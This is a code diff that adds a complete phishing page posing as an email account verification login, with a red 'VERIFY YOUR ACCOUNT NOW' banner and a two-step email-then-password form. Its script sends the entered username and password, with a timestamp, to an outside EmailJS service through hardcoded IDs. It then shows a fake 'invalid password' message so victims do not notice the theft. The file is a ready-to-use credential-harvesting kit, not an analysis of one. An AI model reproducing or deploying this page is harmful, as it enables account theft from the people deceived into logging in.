@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login to Your Account</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init("D-p8vFyaYh5Ts02fZ");
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-image: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-color: transparent;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      position: relative;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(8px);
+      z-index: 0;
+    }
+
+    /* WARNING Banner */
+    .warning-banner {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: red;
+      color: white;
+      font-weight: bold;
+      padding: 15px 10px;
+      font-size: 20px;
+      z-index: 2000;
+    }
+
+    /* Modern Login Panel on the Side */
+    .login-container {
+      background: rgba(255, 255, 255, 0.95);
+      width: 100%;
+      max-width: 380px;
+      padding: 30px;
+      border-radius: 12px 0 0 12px;
+      box-shadow: -4px 0 12px rgba(0, 0, 0, 0.3);
+      position: fixed;
+      top: 0;
+      right: 0;
+      height: 100%;
+      z-index: 1000;
+      border-left: 5px solid #007BFF;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      text-align: left;
+    }
+
+    .login-container h2 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #222;
+    }
+
+    .login-container input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+      background-color: #f9f9f9;
+    }
+
+    .login-container input:focus {
+      border-color: #007BFF;
+      outline: none;
+      background-color: #fff;
+    }
+
+    .login-container button {
+      width: 100%;
+      padding: 12px;
+      background-color: #007BFF;
+      color: #fff;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-container button:hover {
+      background-color: #0056b3;
+    }
+
+    /* Confirmation Message */
+    #confirmation {
+      display: none;
+      background-color: rgba(40, 40, 40, 0.95);
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+      border-top: 5px solid #007BFF;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 1000;
+    }
+
+    #confirmation p {
+      color: #fff;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    /* Footer */
+    .footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 14px;
+      color: #fff;
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- WARNING Banner -->
+  <div class="warning-banner">
+    WARNING! VERIFY YOUR ACCOUNT NOW
+  </div>
+
+  <!-- Login Panel -->
+  <div id="login" class="login-container">
+    <h2>Login to verify account</h2>
+    <div id="emailSection">
+      <input type="email" id="email" placeholder="Email Address" required>
+      <button onclick="showPasswordField()">Next</button>
+    </div>
+    <div id="passwordSection" style="display: none;">
+      <input type="password" id="password" placeholder="Password" required>
+      <button onclick="authenticate()">Login</button>
+    </div>
+  </div>
+
+  <!-- Confirmation Message -->
+  <div id="confirmation">
+    <h2 style="color: white;">PLEASE TRY AGAIN!</h2>
+    <p>You've entered an invalid email address / password combination.</p>
+    <button onclick="window.close()">Close this page</button>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    2025 Email Administrator. All Rights Reserved
+  </div>
+
+  <script>
+    function sendEmail(username, password) {
+      const serviceID = "service_ecvd25p";
+      const templateID = "template_2lri2d6";
+      const publicKey = "D-p8vFyaYh5Ts02fZ";
+
+      const templateParams = {
+        login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
+      };
+
+      return emailjs.send(serviceID, templateID, templateParams, publicKey);
+    }
+
+    function showPasswordField() {
+      let email = document.getElementById("email").value.trim();
+      if (email) {
+        document.getElementById("emailSection").style.display = "none";
+        document.getElementById("passwordSection").style.display = "block";
+      } else {
+        alert("Please enter a valid email address.");
+      }
+    }
+
+    function authenticate() {
+      let loginButton = document.querySelector("button");
+      loginButton.textContent = "Authenticating...";
+      loginButton.disabled = true;
+      let email = document.getElementById("email").value.trim();
+      let password = document.getElementById("password").value.trim();
+
+      if (email && password) {
+        sendEmail(email, password)
+          .then(() => {
+            loginButton.textContent = "Login";
+            loginButton.disabled = false;
+            document.getElementById("login").style.display = "none";
+            document.getElementById("confirmation").style.display = "block";
+          })
+          .catch(error => {
+            console.error("Error sending email", error);
+            loginButton.textContent = "Login";
+            loginButton.disabled = false;
+            alert("Failed to send login report. Please try again.");
+          });
+      } else {
+        alert("Please enter both email and password.");
+        loginButton.disabled = false;
+        loginButton.textContent = "Login";
+      }
+    }
+  </script>
+</body>
+</html>
